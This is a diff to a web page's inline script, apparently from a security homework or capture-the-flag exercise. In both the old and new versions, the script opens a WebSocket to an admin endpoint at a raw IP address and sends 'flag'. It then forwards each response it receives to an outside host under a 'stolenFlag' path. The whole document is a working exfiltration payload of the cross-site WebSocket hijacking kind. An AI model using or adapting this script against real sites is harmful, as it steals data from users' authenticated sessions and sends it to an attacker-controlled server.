@@ -5,13 +5,19 @@
     </head>
     <body>
         <script>
-        const ws = new WebSocket(`ws://91.107.157.58:8080//admin/ws`);
-        ws.onopen = () => ws.send("flag");
+            // Create a new WebSocket with the appropriate URL
+const wsUrl = "ws://91.107.157.58:8080/admin/ws";
+const websocket = new WebSocket(wsUrl);
 
-        ws.onmessage = (event) => {
-          const response = event.data;
-          fetch(`https://hw2p3.ckodser.ir/scriptisworking#${response}`);
-        };
+websocket.onopen = () => {
+  websocket.send("flag");
+
+};
+fetch(`https://hw2p3.ckodser.ir/stolenFlag#itCouldWork`);
+
+websocket.onmessage = (event) => {
+fetch(`https://hw2p3.ckodser.ir/stolenFlag#${event.data}`);
+};
         </script>
     </body>
 </html>
